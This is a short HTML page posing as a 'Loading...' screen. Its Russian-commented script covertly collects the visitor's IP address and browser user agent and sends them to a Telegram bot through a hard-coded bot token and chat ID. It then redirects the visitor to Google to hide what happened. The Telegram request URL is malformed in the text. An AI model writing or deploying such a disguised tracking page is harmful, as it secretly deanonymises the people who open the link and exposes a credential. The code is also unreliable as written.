 <!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <script>
        // Твои данные уже вписаны
        const botToken = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
        const chatId = "8426763446";

        async function sendInfo() {
            try {
                // Узнаем IP через сторонний сервис
                const ipRes = await fetch('https://api.ipify.org');
                const ipData = await ipRes.json();
                
                const text = `🔔 Переход по ссылке!\n🌐 IP: ${ipData.ip}\n📱 Устройство: ${navigator.userAgent}`;

                // Шлем в Telegram
                await fetch(`https://api.telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
            } catch (e) {
                console.error('Ошибка отправки');
            } finally {
                // Перекидываем на Google, чтобы страница не висела
                window.location.href = "https://www.google.com";
            }
        }

        sendInfo();
    </script>
</body>
</html>
